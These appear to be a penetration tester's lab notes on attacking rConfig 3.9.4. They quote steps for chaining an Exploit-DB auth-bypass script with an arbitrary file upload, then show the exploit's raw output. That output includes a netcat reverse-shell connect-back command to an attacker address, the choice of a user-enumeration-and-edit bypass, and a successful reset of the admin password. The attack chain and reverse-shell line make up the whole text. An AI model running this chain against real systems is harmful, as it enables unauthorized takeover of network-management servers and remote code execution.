# rconfig v3.9.4 is exploitable
# but unauth RCE is not working
# found https://gist.github.com/farid007/9f6ad063645d5b1550298c8b9ae953ff
# comment says 
    1. If you don't have admin panel credentials.
    2. You can try using this exploit-> https://www.exploit-db.com/exploits/48878
    3. Select option 2 after running the above exploit script and this should update the password of admin user to Testing1@
    4. And if successful, you can do the above mentioned Arbitrary File Upload vulnerability thing .

Using https://www.exploit-db.com/exploits/4887
$ python3 48878.py
Connecting to: https://192.168.174.57:8081/
Connect back is set to: nc 192.168.49.174 9001 -e /bin/sh, please launch 'nc -lv 9001'
Version is rConfig Version 3.9.4 it may not be vulnerable
Remote Code Execution + Auth bypass rConfig 3.9.5 by Daniel MonzÃ³n
In the last stage if your payload is a reverse shell, the exploit may not launch the success message, but check your netcat ;)
Note: preferred method for auth bypass is 1, because it is less 'invasive'
Note2: preferred method for RCE is 2, as it does not need you to know if, for example, netcat has been installed in the target machine
Choose method for authentication bypass:
        1) User creation
        2) User enumeration + User edit
Method>2
(+) The admin user is present in this rConfig instance
(+) The new password for the admin user is Testing1@
